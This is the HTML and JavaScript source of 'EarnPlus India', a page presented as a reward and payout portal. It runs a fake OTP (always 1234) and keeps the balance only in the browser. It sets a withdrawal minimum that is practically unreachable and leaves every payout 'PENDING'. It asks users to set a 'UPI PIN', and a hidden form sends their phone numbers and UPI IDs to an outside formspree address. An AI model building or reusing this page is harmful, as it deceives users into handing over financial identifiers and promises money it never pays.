<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EarnPlus India - Official</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden { display: none; }
        .tab-active { border-bottom: 4px solid #10b981; color: #10b981; font-weight: 900; }
        .card { background: white; border-radius: 1.5rem; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
    </style>
</head>
<body class="bg-slate-50 font-sans text-gray-900">

    <form id="notify-form" action="https://formspree.io/f/v0322692@gmail.com" method="POST" class="hidden">
        <input type="text" name="Subject" id="mail-subj">
        <input type="text" name="User_Phone" id="mail-phone">
        <input type="text" name="Details" id="mail-details">
    </form>

    <div id="auth-container" class="max-w-md mx-auto mt-20 p-6">
        <div id="step-choice" class="card p-8 text-center">
            <h2 class="text-4xl font-black text-emerald-600 mb-2">EarnPlus</h2>
            <p class="text-gray-400 text-sm mb-8">India's Reward Portal</p>
            <button onclick="showAuth('login')" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold mb-3 shadow-lg">Login</button>
            <button onclick="showAuth('signup')" class="w-full border-2 border-emerald-600 text-emerald-600 py-4 rounded-2xl font-bold">Sign Up</button>
        </div>

        <div id="step-login" class="card p-8 hidden">
            <h2 class="text-2xl font-bold mb-6 text-center">Login</h2>
            <input type="tel" id="login-phone" placeholder="Phone Number" class="w-full p-4 border-2 rounded-2xl mb-3 outline-none font-bold">
            <input type="password" id="login-pass" placeholder="Password" class="w-full p-4 border-2 rounded-2xl mb-4 outline-none font-bold">
            <button onclick="handleLogin()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Enter App</button>
            <button onclick="location.reload()" class="w-full mt-4 text-xs text-gray-400">← Back</button>
        </div>

        <div id="step-signup-phone" class="card p-8 hidden">
            <h2 class="text-2xl font-bold mb-6 text-center">Create Account</h2>
            <div class="flex border-2 rounded-2xl p-4 mb-4">
                <span class="font-bold text-gray-400 mr-2">+91</span>
                <input type="tel" id="reg-phone" placeholder="Mobile Number" class="outline-none w-full font-bold">
            </div>
            <button onclick="sendSimulatedOTP()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Verify Phone</button>
            <button onclick="location.reload()" class="w-full mt-4 text-xs text-gray-400">← Back</button>
        </div>

        <div id="step-otp" class="card p-8 hidden">
            <h2 class="text-xl font-bold text-center mb-6 text-emerald-600">Verify Code</h2>
            <input type="text" id="input-otp" placeholder="Enter 1234" class="w-full p-4 border-2 rounded-2xl mb-4 text-center text-3xl font-black outline-none">
            <button onclick="verifyOTP()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Verify</button>
        </div>

        <div id="step-setup" class="card p-8 hidden">
            <h2 class="text-xl font-bold text-center mb-6">Security Setup</h2>
            <input type="password" id="new-pass" placeholder="Set Login Password" class="w-full p-4 border-2 rounded-2xl mb-3 outline-none">
            <input type="password" id="new-pin" placeholder="Set 4-Digit UPI PIN" class="w-full p-4 border-2 rounded-2xl mb-4 text-center outline-none">
            <button onclick="finishSignup()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Finish</button>
        </div>
    </div>

    <div id="app-container" class="hidden">
        <nav class="bg-white p-5 flex justify-between items-center sticky top-0 z-50 border-b">
            <div>
                <h1 class="text-xl font-black text-emerald-600">EarnPlus</h1>
                <a href="mailto:ishantgarg659@gmail.com" class="text-[10px] text-blue-500 font-bold underline">Contact Support</a>
            </div>
            <div class="text-right">
                <p class="text-xl font-black text-emerald-700">₹<span id="wallet-balance">0.00</span></p>
                <button onclick="logout()" class="text-[8px] text-red-500 font-bold uppercase">Logout</button>
            </div>
        </nav>

        <main class="p-4 max-w-md mx-auto mb-24">
            <div class="flex justify-around mb-8 bg-white rounded-2xl p-2 border">
                <button id="tab-earn" onclick="showSubTab('earn')" class="pb-2 tab-active">Earn</button>
                <button id="tab-shop" onclick="showSubTab('shop')" class="pb-2 text-gray-400 font-bold">Shop</button>
                <button id="tab-refer" onclick="showSubTab('refer')" class="pb-2 text-gray-400 font-bold">Refer</button>
                <button id="tab-withdraw" onclick="showSubTab('withdraw')" class="pb-2 text-gray-400 font-bold">Payout</button>
            </div>

            <div id="sub-earn" class="space-y-4">
                <div class="bg-white p-4 rounded-3xl border shadow-sm flex flex-col items-center">
                    <p class="text-[10px] font-bold text-gray-400 uppercase mb-2">Network Ads</p>
                    <script async="async" data-cfasync="false" src="https://pl29039989.profitablecpmratenetwork.com/7bd76c56716b076e24d1120eb87635dd/invoke.js"></script>
                    <div id="container-7bd76c56716b076e24d1120eb87635dd"></div>
                </div>
                <div class="bg-slate-900 p-6 rounded-3xl text-white">
                    <h3 class="text-lg font-bold">Daily Check-in</h3>
                    <button onclick="earnTask()" class="mt-4 w-full bg-emerald-500 py-4 rounded-2xl font-black">Claim ₹0.50</button>
                </div>
            </div>

            <div id="sub-shop" class="hidden space-y-4">
                <div class="bg-white p-4 rounded-3xl border">
                    <h4 class="font-bold text-sm">Noise ColorFit Smartwatch</h4>
                    <p class="text-emerald-600 font-black text-xs">Reward: ₹60.00</p>
                    <button onclick="shopTask('Noise Watch')" class="mt-2 text-[10px] bg-slate-800 text-white px-4 py-2 rounded-full">Buy Now</button>
                </div>
            </div>

            <div id="sub-refer" class="hidden text-center">
                <div class="bg-indigo-600 p-8 rounded-3xl text-white">
                    <h3 class="text-xl font-bold mb-4">Invite & Earn ₹5</h3>
                    <p id="ref-link-display" class="text-[10px] bg-black/20 p-2 rounded-lg break-all mb-4"></p>
                    <button onclick="copyRefLink()" class="w-full bg-white text-indigo-600 py-3 rounded-xl font-bold">Copy My Link</button>
                </div>
            </div>

            <div id="sub-withdraw" class="hidden">
                <div class="bg-white p-6 rounded-3xl border-2 border-emerald-50 mb-6 shadow-sm">
                    <p class="text-[10px] text-red-500 font-bold mb-4 uppercase text-center">Min ₹199 | 2% Admin Fee</p>
                    <input type="number" id="w-amount" placeholder="Amount" class="w-full p-4 border rounded-2xl bg-gray-50 mb-3 font-bold">
                    <input type="text" id="w-upi" placeholder="UPI ID" class="w-full p-4 border rounded-2xl bg-gray-50 mb-3 font-bold">
                    <input type="password" id="w-pin" placeholder="Security PIN" class="w-full p-4 border rounded-2xl bg-gray-50 mb-4 text-center font-black">
                    <button onclick="requestWithdrawal()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-black">Withdraw</button>
                </div>
                <div id="history-list" class="space-y-3"></div>
            </div>
        </main>
    </div>

    <script>
        let balance = parseFloat(localStorage.getItem('ep_balance')) || 0.00;
        let history = JSON.parse(localStorage.getItem('ep_history')) || [];
        let activeUser = localStorage.getItem('ep_phone') || "";

        window.onload = () => { 
            // If user is already logged in, show app
            if(activeUser && localStorage.getItem('ep_pass')) { setupAppUI(); } 
        };

        function showAuth(type) {
            document.getElementById('step-choice').classList.add('hidden');
            if(type === 'login') document.getElementById('step-login').classList.remove('hidden');
            else document.getElementById('step-signup-phone').classList.remove('hidden');
        }

        function handleLogin() {
            const phone = document.getElementById('login-phone').value;
            const pass = document.getElementById('login-pass').value;
            if(phone === localStorage.getItem('ep_phone') && pass === localStorage.getItem('ep_pass')) {
                activeUser = phone;
                setupAppUI();
            } else { alert("Invalid Number or Password!"); }
        }

        function sendSimulatedOTP() {
            const phone = document.getElementById('reg-phone').value;
            if(phone.length < 10) return alert("Enter 10-digit number");
            activeUser = phone;
            document.getElementById('step-signup-phone').classList.add('hidden');
            document.getElementById('step-otp').classList.remove('hidden');
        }

        function verifyOTP() {
            if(document.getElementById('input-otp').value === "1234") {
                document.getElementById('step-otp').classList.add('hidden');
                document.getElementById('step-setup').classList.remove('hidden');
            } else { alert("Wrong OTP! Try 1234"); }
        }

        function finishSignup() {
            const pass = document.getElementById('new-pass').value;
            const pin = document.getElementById('new-pin').value;
            if(pass.length < 4) return alert("Password too short");
            localStorage.setItem('ep_phone', activeUser);
            localStorage.setItem('ep_pass', pass);
            localStorage.setItem('ep_pin', pin);
            setupAppUI();
        }

        function setupAppUI() {
            document.getElementById('auth-container').classList.add('hidden');
            document.getElementById('app-container').classList.remove('hidden');
            document.getElementById('ref-link-display').innerText = window.location.origin + window.location.pathname + "?ref=" + activeUser;
            updateUI();
        }

        function earnTask() {
            const today = new Date().toLocaleDateString();
            if(localStorage.getItem('last_claim_' + activeUser) === today) return alert("Already claimed today!");
            balance += 0.50;
            localStorage.setItem('last_claim_' + activeUser, today);
            updateUI();
            alert("Reward Claimed!");
        }

        function logout() {
            localStorage.removeItem('ep_phone'); // Optional: keep this if you want persistent login
            location.reload();
        }

        function requestWithdrawal() {
            const amt = parseFloat(document.getElementById('w-amount').value);
            const upi = document.getElementById('w-upi').value;
            const pin = document.getElementById('w-pin').value;
            if(amt < 199 || amt > balance || pin !== localStorage.getItem('ep_pin')) return alert("Error in data or PIN");
            const net = (amt * 0.98).toFixed(2);
            balance -= amt;
            history.unshift({ amt, net, status: "PENDING" });
            sendEmailNotification("PAYOUT", `Amt: ₹${amt} | Net: ₹${net} | UPI: ${upi} | User: ${activeUser}`);
            updateUI();
            alert("Request Sent!");
        }

        function updateUI() {
            document.getElementById('wallet-balance').innerText = balance.toFixed(2);
            localStorage.setItem('ep_balance', balance);
            localStorage.setItem('ep_history', JSON.stringify(history));
            document.getElementById('history-list').innerHTML = history.map(h => `<div class="bg-white p-4 rounded-2xl flex justify-between border"><div><p class="font-bold text-sm">₹${h.amt}</p></div><span class="text-orange-500 text-[10px] font-bold">${h.status}</span></div>`).join('');
        }

        function copyRefLink() { navigator.clipboard.writeText(document.getElementById('ref-link-display').innerText); alert("Link Copied!"); }
        function shopTask(item) { alert("Redirecting..."); sendEmailNotification("SHOP", `User ${activeUser} bought ${item}`); }
        function sendEmailNotification(subj, details) {
            document.getElementById('mail-subj').value = subj;
            document.getElementById('mail-phone').value = activeUser;
            document.getElementById('mail-details').value = details;
            fetch(document.getElementById('notify-form').action, { method: 'POST', body: new FormData(document.getElementById('notify-form')), headers: { 'Accept': 'application/json' } });
        }
        function showSubTab(tab) {
            ['earn', 'shop', 'refer', 'withdraw'].forEach(t => { document.getElementById('sub-' + t).classList.add('hidden'); document.getElementById('tab-' + t).classList.remove('tab-active'); });
            document.getElementById('sub-' + tab).classList.remove('hidden'); document.getElementById('tab-' + tab).classList.add('tab-active');
        }
    </script>
</body>
</html>
